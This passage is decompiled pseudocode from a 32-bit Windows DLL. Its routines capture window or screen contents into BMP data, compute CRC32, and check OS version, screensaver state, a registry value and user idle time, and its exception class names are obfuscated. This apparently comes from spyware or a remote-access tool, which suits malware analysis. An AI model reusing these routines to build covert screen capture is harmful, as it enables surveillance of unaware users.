  int CurrentProcessId; // [esp-4h] [ebp-20h]

  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_10093CE0;
  v2 = *(void **)(a2 + 16);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10029136((_DWORD *)(a1 + 12), v2, 0, 0, v3, CurrentProcessId);
  return a1;
}
// 10093CE0: using guessed type int (__thiscall *off_10093CE0[6])(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (10014D74) --------------------------------------------------------
bool __thiscall sub_10014D74(_DWORD *this)
{
  bool result; // al

  *this = off_10093CE0;
  result = sub_10014389(this + 3);
  *this = &off_10093D08;
  return result;
}
// 10093CE0: using guessed type int (__thiscall *off_10093CE0[6])(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (10014DA7) --------------------------------------------------------
_DWORD *__stdcall sub_10014DA7(_DWORD *a1, void *a2, char a3)
{
  void *v3; // eax
  int v4; // eax

  *a1 = &off_1009375C;
  v3 = operator new(0x14u);
  if ( v3 )
    v4 = sub_10014CB0((int)v3, a2, a3);
  else
    v4 = 0;
  a1[1] = v4;
  sub_1000EE1D(a1 + 1);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009375C: using guessed type int (__thiscall *off_1009375C)(void *Block, char);

//----- (10014DFB) --------------------------------------------------------
LONG __thiscall sub_10014DFB(int *this)
{
  *this = (int)&off_1009375C;
  return sub_1000EDE9(this + 1);
}
// 1009375C: using guessed type int (__thiscall *off_1009375C)(void *Block, char);

//----- (10014E23) --------------------------------------------------------
void __stdcall sub_10014E23(int a1, int a2, int a3)
{
  _DWORD v3[197]; // [esp+10h] [ebp-32Ch] BYREF
  int v4[5]; // [esp+324h] [ebp-18h] BYREF
  int v5; // [esp+338h] [ebp-4h]

  sub_10029C27(v3);
  v5 = 0;
  sub_10029D3F(a1, (int)v3);
  sub_10029FF4(v4, a2, a3);
  LOBYTE(v5) = 0;
  sub_10014DFB(v4);
  v5 = -1;
  sub_10029CB1(v3);
}
// 10029FF4: using guessed type _DWORD __stdcall sub_10029FF4(_DWORD, _DWORD, _DWORD pExceptionObject);
// 10014E23: using guessed type _DWORD var_32C[197];
// 10014E23: using guessed type int var_18[5];

//----- (10014E87) --------------------------------------------------------
BOOL __thiscall sub_10014E87(_DWORD *this)
{
  return sub_100143F3(this[1] + 12);
}

//----- (10014E92) --------------------------------------------------------
void __thiscall sub_10014E92(int *this, void *a2, int a3)
{
  int *v3; // edi
  int v4; // esi
  void *v5; // eax
  int v6; // eax
  DWORD v7; // eax
  int CurrentProcessId; // [esp-4h] [ebp-24h]

  v3 = this + 1;
  v4 = this[1];
  if ( *(_DWORD *)(v4 + 4) <= 1u )
  {
    CurrentProcessId = GetCurrentProcessId();
    v7 = GetCurrentProcessId();
    sub_10015027((_DWORD *)(v4 + 12), a2, a3, 0, v7, CurrentProcessId);
  }
  else
  {
    v5 = operator new(0x14u);
    if ( v5 )
      v6 = sub_10014CB0((int)v5, a2, a3);
    else
      v6 = 0;
    a3 = v6;
    sub_1000EE1D(&a3);
    sub_10013739(&a3, v3);
    sub_1000EDE9(&a3);
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10014F1D) --------------------------------------------------------
int __thiscall sub_10014F1D(int *this)
{
  int *v1; // edi
  int v2; // eax
  void *v3; // eax
  void *v4; // eax
  int v6; // [esp+10h] [ebp-14h]
  void *Block[3]; // [esp+14h] [ebp-10h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  v1 = this + 1;
  v2 = this[1];
  v6 = *(_DWORD *)(v2 + 16);
  if ( *(_DWORD *)(v2 + 4) <= 1u )
  {
    *(_DWORD *)(*v1 + 16) = -1;
  }
  else
  {
    v3 = operator new(0x14u);
    Block[0] = v3;
    v8 = 0;
    if ( v3 )
      v4 = (void *)sub_10014CB0((int)v3, (void *)0xFFFFFFFF, 0);
    else
      v4 = 0;
    v8 = -1;
    Block[0] = v4;
    sub_1000EE1D((int *)Block);
    v8 = 1;
    sub_10013739((int *)Block, v1);
    v8 = -1;
    sub_1000EDE9((int *)Block);
  }
  return v6;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10014F97) --------------------------------------------------------
bool __stdcall sub_10014F97(int a1)
{
  _DWORD v2[197]; // [esp+10h] [ebp-32Ch] BYREF
  int v3[5]; // [esp+324h] [ebp-18h] BYREF
  int v4; // [esp+338h] [ebp-4h]
  bool v5; // [esp+347h] [ebp+Bh]

  sub_10029C27(v2);
  v4 = 0;
  sub_10029D3F(a1, (int)v2);
  sub_10029EA4((int)v2, v3, 0, 0);
  LOBYTE(v4) = 1;
  v5 = *(_DWORD *)(v3[1] + 16) != -1;
  LOBYTE(v4) = 0;
  sub_10014DFB(v3);
  v4 = -1;
  sub_10029CB1(v2);
  return v5;
}
// 10014F97: using guessed type _DWORD var_32C[197];

//----- (1001500F) --------------------------------------------------------
bool __usercall sub_1001500F@<al>(int a1@<eax>, int a2@<ecx>)
{
  return a1 == a2 || *(_DWORD *)(*(_DWORD *)(a2 + 4) + 16) == *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
}

//----- (10015027) --------------------------------------------------------
void __thiscall sub_10015027(_DWORD *this, void *a2, char a3, BOOL a4, DWORD a5, int a6)
{
  int v7; // eax
  _DWORD pExceptionObject[3]; // [esp+8h] [ebp-Ch] BYREF

  if ( (void *)this[1] != a2 && !sub_100143D9((int)this) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( a3 )
  {
    sub_100293A5(a2, a4, a5);
    this[1] = v7;
  }
  else
  {
    this[1] = a2;
  }
}
// 10015072: variable 'v7' is possibly undefined
// 10015027: using guessed type _DWORD pExceptionObject[3];

//----- (1001509C) --------------------------------------------------------
_DWORD *__stdcall sub_1001509C(_DWORD *a1, int a2, int a3)
{
  *a1 = off_10093CF0;
  a1[1] = a2;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_100292B6(a1 + 2);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10029306(a1 + 4);
  sub_10017D60(a1 + 6);
  a1[15] = 0;
  a1[16] = a3;
  return a1;
}
// 10093CF0: using guessed type int (__thiscall *off_10093CF0[2])(void *Block, char);

//----- (10015102) --------------------------------------------------------
_DWORD *__thiscall sub_10015102(_DWORD *Block, char a2)
{
  sub_10015121(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015121) --------------------------------------------------------
char __thiscall sub_10015121(_DWORD *this)
{
  *this = off_10093CF0;
  sub_10017DC3((int)(this + 6));
  sub_100156D4(this + 4);
  return sub_1001566E(this + 2);
}
// 10093CF0: using guessed type int (__thiscall *off_10093CF0[2])(void *Block, char);

//----- (10015165) --------------------------------------------------------
LONG __thiscall sub_10015165(int this, int a2)
{
  int *v3; // eax
  int v5[5]; // [esp+10h] [ebp-54h] BYREF
  struct tagRECT Rect; // [esp+24h] [ebp-40h] BYREF
  _DWORD v7[3]; // [esp+34h] [ebp-30h] BYREF
  _DWORD v8[3]; // [esp+40h] [ebp-24h] BYREF
  _DWORD pExceptionObject[4]; // [esp+50h] [ebp-14h] BYREF
  int v10; // [esp+60h] [ebp-4h]

  *(_DWORD *)(this + 60) = 4;
  memset(&Rect, 0, sizeof(Rect));
  v10 = 0;
  if ( *(_DWORD *)(this + 64) == 1 )
  {
    if ( !GetWindowRect(*(HWND *)(this + 4), &Rect) )
    {
      sub_100167F9(v7, 1);
      _CxxThrowException(v7, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  else
  {
    if ( *(_DWORD *)(this + 64) != 2 )
    {
      sub_10015246(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__);
    }
    if ( !GetClientRect(*(HWND *)(this + 4), &Rect) )
    {
      sub_100167F9(v8, 1);
      _CxxThrowException(v8, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  sub_100152C4(this, &Rect);
  v3 = (int *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)(this + 24) + 36))(this + 24, v5);
  LOBYTE(v10) = 1;
  sub_10016B2F(v3, a2);
  LOBYTE(v10) = 0;
  return sub_10016B53(v5);
}
// 10015165: using guessed type _DWORD pExceptionObject[4];
// 10015165: using guessed type _DWORD var_24[3];
// 10015165: using guessed type _DWORD var_30[3];
// 10015165: using guessed type int var_54[5];

//----- (10015246) --------------------------------------------------------
_DWORD *__stdcall sub_10015246(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093CF4;
  return a1;
}
// 10093CF4: using guessed type int (__thiscall *off_10093CF4)(void *Block, char);

//----- (100152C4) --------------------------------------------------------
char __stdcall sub_100152C4(int a1, _DWORD *cy)
{
  HDC DC; // eax
  int *p_pExceptionObject; // eax
  HDC CompatibleDC; // eax
  int v5; // edi
  HBITMAP CompatibleBitmap; // eax
  _ThrowInfo *v8; // [esp-4h] [ebp-54h]
  _DWORD v9[3]; // [esp+10h] [ebp-40h] BYREF
  int v10; // [esp+1Ch] [ebp-34h] BYREF
  HDC hdc; // [esp+20h] [ebp-30h]
  int v12; // [esp+24h] [ebp-2Ch]
  int v13; // [esp+28h] [ebp-28h] BYREF
  int v14; // [esp+2Ch] [ebp-24h] BYREF
  int v15; // [esp+30h] [ebp-20h] BYREF
  int pExceptionObject; // [esp+34h] [ebp-1Ch] BYREF
  HGDIOBJ h; // [esp+38h] [ebp-18h]
  int v18; // [esp+4Ch] [ebp-4h]
  int cya; // [esp+5Ch] [ebp+Ch]

  GetCurrentProcessId();
  GetCurrentProcessId();
  DC = GetDC(*(HWND *)(a1 + 4));
  sub_10029263((int)DC, &v10);
  v18 = 0;
  if ( !hdc )
  {
    sub_10016441(&pExceptionObject);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  CompatibleDC = CreateCompatibleDC(hdc);
  sub_1001569F(a1 + 8, (int)CompatibleDC);
  if ( !*(_DWORD *)(a1 + 12) )
  {
    sub_10016441(&v15);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v15;
    goto LABEL_3;
  }
  v12 = cy[2] - *cy;
  v5 = v12;
  cya = cy[3] - cy[1];
  GetCurrentProcessId();
  GetCurrentProcessId();
  CompatibleBitmap = CreateCompatibleBitmap(hdc, v5, cya);
  sub_10015705(a1 + 16, (int)CompatibleBitmap);
  if ( !*(_DWORD *)(a1 + 20) )
  {
    sub_10016441(&v14);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v14;
    goto LABEL_3;
  }
  h = SelectObject(*(HDC *)(a1 + 12), *(HGDIOBJ *)(a1 + 20));
  if ( !h )
  {
    sub_10016441(&v13);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v13;
    goto LABEL_3;
  }
  LOBYTE(v18) = 1;
  if ( !BitBlt(*(HDC *)(a1 + 12), 0, 0, v12, cya, hdc, 0, 0, 0xCC0020u) )
  {
    sub_100167F9(v9, 1);
    v8 = (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__;
    p_pExceptionObject = v9;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v8);
  }
  sub_1001552A((_DWORD *)a1);
  v18 = 0;
  SelectObject(*(HDC *)(a1 + 12), h);
  v18 = -1;
  return sub_1001563D(&v10);
}
// 100152C4: using guessed type _DWORD var_40[3];

//----- (10015439) --------------------------------------------------------
_DWORD *__userpurge sub_10015439@<eax>(int a1@<esi>, _DWORD *a2)
{
  int v2; // ecx
  _DWORD *v3; // eax
  int v4; // ecx
  int v5; // eax
  int pv; // [esp+10h] [ebp-3Ch] BYREF
  int v8; // [esp+14h] [ebp-38h]
  int v9; // [esp+18h] [ebp-34h]
  int v10; // [esp+1Ch] [ebp-30h]
  int v11; // [esp+20h] [ebp-2Ch]
  int v12; // [esp+24h] [ebp-28h]
  int v13[2]; // [esp+28h] [ebp-24h] BYREF
  _DWORD pExceptionObject[3]; // [esp+30h] [ebp-1Ch] BYREF
  int v15; // [esp+3Ch] [ebp-10h]
  int v16; // [esp+48h] [ebp-4h]

  v16 = 0;
  v15 = 0;
  pv = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  if ( !GetObjectA(*(HANDLE *)(a1 + 20), 24, &pv) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10016983((void *)0x28, (int)a2, 0);
  v16 = 0;
  v2 = *(_DWORD *)(a1 + 60);
  v15 = 1;
  if ( v2 != 24 )
  {
    v3 = (_DWORD *)sub_10016983((void *)(4 * (1 << v2)), (int)v13, 0);
    v16 = 1;
    sub_10016CD5(v3, (int)a2);
    LOBYTE(v16) = 0;
    sub_10016B53(v13);
  }
  v4 = sub_10016C24(a2);
  *(_DWORD *)v4 = 40;
  *(_DWORD *)(v4 + 4) = v8;
  *(_DWORD *)(v4 + 8) = v9;
  *(_WORD *)(v4 + 12) = 1;
  *(_WORD *)(v4 + 14) = *(_WORD *)(a1 + 60);
  v5 = *(_DWORD *)(v4 + 8) * *(unsigned __int16 *)(v4 + 14) * ((*(_DWORD *)(v4 + 4) + 7) / 8);
  *(_DWORD *)(v4 + 16) = 0;
  *(_DWORD *)(v4 + 20) = v5;
  *(_DWORD *)(v4 + 32) = 0;
  *(_DWORD *)(v4 + 36) = 0;
  return a2;
}
// 10015439: using guessed type _DWORD pExceptionObject[3];

//----- (1001552A) --------------------------------------------------------
LONG __thiscall sub_1001552A(_DWORD *this)
{
  int v2; // edi
  HDC v3; // ebx
  void *v4; // eax
  HBITMAP v5; // edx
  int v6; // edi
  int v7; // edi
  int v8; // eax
  _DWORD *v9; // esi
  int v11[5]; // [esp+10h] [ebp-58h] BYREF
  int v12[5]; // [esp+24h] [ebp-44h] BYREF
  int v13[3]; // [esp+38h] [ebp-30h] BYREF
  int v14; // [esp+44h] [ebp-24h]
  _DWORD pExceptionObject[3]; // [esp+4Ch] [ebp-1Ch] BYREF
  int v16; // [esp+58h] [ebp-10h]
  int v17; // [esp+64h] [ebp-4h]

  sub_10015439((int)this, v13);
  v17 = 0;
  v2 = sub_10016C24(v13);
  sub_10016983(*(void **)(v2 + 20), (int)v11, 0);
  LOBYTE(v17) = 1;
  v3 = (HDC)this[3];
  v4 = (void *)sub_10016C24(v11);
  if ( !GetDIBits(v3, v5, 0, *(_DWORD *)(v2 + 8), v4, (LPBITMAPINFO)v2, 0) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v6 = *(_DWORD *)(v2 + 20);
  v16 = v14 + 14;
  v7 = v14 + 14 + v6;
  sub_10016983((void *)0xE, (int)v12, 0);
  LOBYTE(v17) = 2;
  v8 = sub_10016C24(v12);
  *(_DWORD *)(v8 + 10) = v16;
  v9 = this + 6;
  *(_WORD *)v8 = 19778;
  *(_DWORD *)(v8 + 2) = v7;
  *(_WORD *)(v8 + 6) = 0;
  *(_WORD *)(v8 + 8) = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v12);
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v13);
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v11);
  LOBYTE(v17) = 1;
  sub_10016B53(v12);
  LOBYTE(v17) = 0;
  sub_10016B53(v11);
  v17 = -1;
  return sub_10016B53(v13);
}
// 1001557A: variable 'v5' is possibly undefined
// 1001552A: using guessed type int var_30[3];
// 1001552A: using guessed type int var_58[5];
// 1001552A: using guessed type _DWORD pExceptionObject[3];
// 1001552A: using guessed type int var_44[5];

//----- (1001563D) --------------------------------------------------------
char __thiscall sub_1001563D(_DWORD *this)
{
  *this = off_10093CE4;
  return sub_10015797((int)this);
}
// 10093CE4: using guessed type int (__thiscall *off_10093CE4[5])(void *Block, char);

//----- (1001566E) --------------------------------------------------------
char __thiscall sub_1001566E(_DWORD *this)
{
  *this = off_10093CE8;
  return sub_100157B1((int)this);
}
// 10093CE8: using guessed type int (__thiscall *off_10093CE8[4])(void *Block, char);

//----- (1001569F) --------------------------------------------------------
char __usercall sub_1001569F@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100157B1(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 1001569F: using guessed type _DWORD pExceptionObject[3];

//----- (100156D4) --------------------------------------------------------
char __thiscall sub_100156D4(_DWORD *this)
{
  *this = off_10093CEC;
  return sub_100157CA((int)this);
}
// 10093CEC: using guessed type int (__thiscall *off_10093CEC[3])(void *Block, char);

//----- (10015705) --------------------------------------------------------
char __usercall sub_10015705@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100157CA(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 10015705: using guessed type _DWORD pExceptionObject[3];

//----- (1001573A) --------------------------------------------------------
_DWORD *__thiscall sub_1001573A(_DWORD *Block, char a2)
{
  sub_1001563D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015759) --------------------------------------------------------
_DWORD *__thiscall sub_10015759(_DWORD *Block, char a2)
{
  sub_1001566E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015778) --------------------------------------------------------
_DWORD *__thiscall sub_10015778(_DWORD *Block, char a2)
{
  sub_100156D4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015797) --------------------------------------------------------
char __usercall sub_10015797@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_100157E3(a1) )
    return 1;
  result = sub_10029277((HDC *)a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100157B1) --------------------------------------------------------
char __usercall sub_100157B1@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_100157F6(a1) )
    return 1;
  result = sub_100292CE(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100157CA) --------------------------------------------------------
char __usercall sub_100157CA@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_10015809(a1) )
    return 1;
  result = sub_1002931E(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100157E3) --------------------------------------------------------
BOOL __usercall sub_100157E3@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (100157F6) --------------------------------------------------------
BOOL __usercall sub_100157F6@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10015809) --------------------------------------------------------
BOOL __usercall sub_10015809@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (1001588D) --------------------------------------------------------
char sub_1001588D()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-10h] BYREF
  int pvParam; // [esp+Ch] [ebp-4h] BYREF

  pvParam = 0;
  if ( !SystemParametersInfoA(0x10u, 0, &pvParam, 0) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( pvParam == 1 && sub_10015E65() == 6 )
    return sub_100158E4();
  else
    return pvParam == 1;
}
// 1001588D: using guessed type _DWORD pExceptionObject[3];

//----- (100158E4) --------------------------------------------------------
char sub_100158E4()
{
  char v0; // bl
  HKEY phkResult; // [esp+4h] [ebp-4h] BYREF

  v0 = 0;
  phkResult = 0;
  if ( !RegOpenKeyExW(HKEY_CURRENT_USER, *(LPCWSTR *)(dword_100BF6CC + 12), 0, 1u, &phkResult)
    && !RegQueryValueExW(phkResult, *(LPCWSTR *)(dword_100BF6C4 + 12), 0, 0, 0, 0) )
  {
    v0 = 1;
  }
  RegCloseKey(phkResult);
  return v0;
}
// 100BF6C4: using guessed type int dword_100BF6C4;
// 100BF6CC: using guessed type int dword_100BF6CC;

//----- (1001597E) --------------------------------------------------------
BOOL sub_1001597E()
{
  int v0; // eax
  _DWORD v2[3]; // [esp+0h] [ebp-14h] BYREF
  int pExceptionObject; // [esp+Ch] [ebp-8h] BYREF
  int pvParam; // [esp+10h] [ebp-4h] BYREF

  v0 = sub_10015E65();
  if ( v0 != 2 && v0 != 3 && v0 != 6 && v0 != 8 && v0 != 7 && v0 != 9 && v0 != 10 )
  {
    sub_100159F9(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVSajslyasyjrZUGifsasajs_kzwdu_sr__);
  }
  pvParam = 0;
  if ( !SystemParametersInfoA(0x72u, 0, &pvParam, 0) )
  {
    sub_100167F9(v2, 1);
    _CxxThrowException(v2, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return pvParam == 1;
}
// 1001597E: using guessed type _DWORD var_14[3];

//----- (100159F9) --------------------------------------------------------
_DWORD *__stdcall sub_100159F9(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093CFC;
  return a1;
}
// 10093CFC: using guessed type int (__thiscall *off_10093CFC)(void *Block, char);

//----- (10015B49) --------------------------------------------------------
DWORD sub_10015B49()
{
  int v0; // ecx
  int v2; // [esp-8h] [ebp-58h] BYREF
  int v3; // [esp-4h] [ebp-54h]
  int v4[6]; // [esp+0h] [ebp-50h] BYREF
  _DWORD pExceptionObject[3]; // [esp+18h] [ebp-38h] BYREF
  int v6[2]; // [esp+24h] [ebp-2Ch] BYREF
  char *v7; // [esp+2Ch] [ebp-24h]
  int *v8; // [esp+30h] [ebp-20h]
  int *v9; // [esp+34h] [ebp-1Ch]
  int v10; // [esp+4Ch] [ebp-4h]

  v10 = 0;
  v9 = v4;
  sub_1000CE26(v4, (int)&unk_100BF6E8);
  LOBYTE(v10) = 1;
  v3 = v0;
  v2 = v0;
  v8 = &v2;
  sub_1000CE26(&v2, (int)&unk_100BF6E0);
  LOBYTE(v10) = 0;
  v7 = sub_1002481B(v2, v3, v4[0]);
  v10 = -1;
  v6[0] = 8;
  if ( !((int (__cdecl *)(int *))v7)(v6) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return GetTickCount() - v6[1];
}
// 10015B6F: variable 'v0' is possibly undefined
// 10015B49: using guessed type _DWORD pExceptionObject[3];

//----- (10015C80) --------------------------------------------------------
int __stdcall sub_10015C80(int a1)
{
  sub_10015C92(a1);
  return a1;
}

//----- (10015C92) --------------------------------------------------------
unsigned int __stdcall sub_10015C92(int a1)
{
  unsigned int result; // eax
  unsigned int v2; // ecx
  int v3; // edx

  for ( result = 0; result < 0x100; ++result )
  {
    v2 = result;
    v3 = 8;
    do
    {
      if ( (v2 & 1) != 0 )
        v2 = (v2 >> 1) ^ 0xEDB88320;
      else
        v2 >>= 1;
      --v3;
    }
    while ( v3 );
    *(_DWORD *)(a1 + 4 * result) = v2;
  }
  return result;
}

//----- (10015CC3) --------------------------------------------------------
int __usercall sub_10015CC3@<eax>(__int32 a1@<eax>, int a2@<esi>)
{
  int v2; // eax

  sub_10015DB4(a1, a2);
  v2 = dword_100BBFBC;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 4) = v2;
  return a2;
}
// 100BBFBC: using guessed type int dword_100BBFBC;

//----- (10015CDE) --------------------------------------------------------
int __usercall sub_10015CDE@<eax>(_DWORD *a1@<ecx>, int a2@<esi>)
{
  unsigned int v2; // edi
  int v3; // ecx
  int v4; // eax
  int v5; // edx
  int result; // eax
  int v7; // [esp+4h] [ebp-4h]

  *(_DWORD *)(a2 + 8) = ~*(_DWORD *)(a2 + 8);
  v2 = 0;
  v7 = sub_10016C24(a1);
  if ( *(_DWORD *)(v3 + 12) )
  {
    v4 = *(_DWORD *)(a2 + 4);
    do
    {
      v5 = *(_DWORD *)(v4 + 4 * (unsigned __int8)(*(_DWORD *)(a2 + 8) ^ *(_BYTE *)(v2 + v7))) ^ (*(_DWORD *)(a2 + 8) >> 8);
      ++v2;
      *(_DWORD *)(a2 + 8) = v5;
    }
    while ( v2 < *(_DWORD *)(v3 + 12) );
  }
  result = ~*(_DWORD *)(a2 + 8);
  *(_DWORD *)(a2 + 8) = result;
  return result;
}
// 10015CED: variable 'v3' is possibly undefined

//----- (10015D26) --------------------------------------------------------
int __fastcall sub_10015D26(int a1, char a2)
{
  unsigned int v2; // eax
  int result; // eax

  v2 = ~*(_DWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 8) = v2;
  result = ~(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * (unsigned __int8)(v2 ^ a2)) ^ (v2 >> 8));
  *(_DWORD *)(a1 + 8) = result;
  return result;
}

//----- (10015D5D) --------------------------------------------------------
void __thiscall sub_10015D5D(void **this)
{
  *this = &off_10093D04;
  if ( this[1] )
    j__free(this[1]);
}
// 10093D04: using guessed type int (__thiscall *off_10093D04)(void *Block, char);

//----- (10015D95) --------------------------------------------------------
void **__thiscall sub_10015D95(void **Block, char a2)
{
  sub_10015D5D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015DB4) --------------------------------------------------------
int __userpurge sub_10015DB4@<eax>(__int32 a1@<eax>, int a2)
{
  sub_10015DC9(a1);
  return a2;
}

//----- (10015DC9) --------------------------------------------------------
int __usercall sub_10015DC9@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  void *v3; // eax
  int v4; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block[3]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = dword_100BBFBC;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_100171BE(dword_100BFA70, v5);
    v7 = 0;
    if ( !dword_100BBFBC )
    {
      v3 = operator new(0x400u);
      Block[0] = v3;
      LOBYTE(v7) = 1;
      if ( v3 )
      {
        v3 = (void *)sub_10015C80((int)v3);
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_100BBFBC = v4;
      dword_100BC74C = v4;
    }
    v7 = -1;
    return sub_100171F2(v5);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBFBC: using guessed type int dword_100BBFBC;
// 100BC74C: using guessed type int dword_100BC74C;
// 100BFA70: using guessed type int dword_100BFA70[9];
// 10015DC9: using guessed type _DWORD var_18[2];

//----- (10015E65) --------------------------------------------------------
int sub_10015E65()
{
  sub_10016206();
  return dword_100B7DF0;
}
// 100B7DF0: using guessed type int dword_100B7DF0;

//----- (10015E70) --------------------------------------------------------
int sub_10015E70()
{
  sub_10016206();
  return dword_100B7DF4;
}
// 100B7DF4: using guessed type int dword_100B7DF4;

//----- (10015E7B) --------------------------------------------------------
int __thiscall sub_10015E7B(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_10016206();
  if ( !sub_10015EC1() )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return dword_100B7DF8;
}
// 100B7DF8: using guessed type int dword_100B7DF8;

//----- (10015EB5) --------------------------------------------------------
BOOL sub_10015EB5()
{
  return sub_10015E70() == 1;
}

//----- (10015EC1) --------------------------------------------------------
BOOL sub_10015EC1()
{
  return sub_10015EB5() && sub_10015E65() >= 6;
}

//----- (10015FF9) --------------------------------------------------------
bool sub_10015FF9()
{
  return sub_10015E65() >= 9;
}

//----- (10016009) --------------------------------------------------------
char __usercall sub_10016009@<al>(_DWORD *a1@<esi>)
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-A0h] BYREF
  unsigned __int8 v3; // [esp+9Ah] [ebp-6h]

  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 156;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  *a1 = v3;
  return 1;
}

//----- (10016052) --------------------------------------------------------
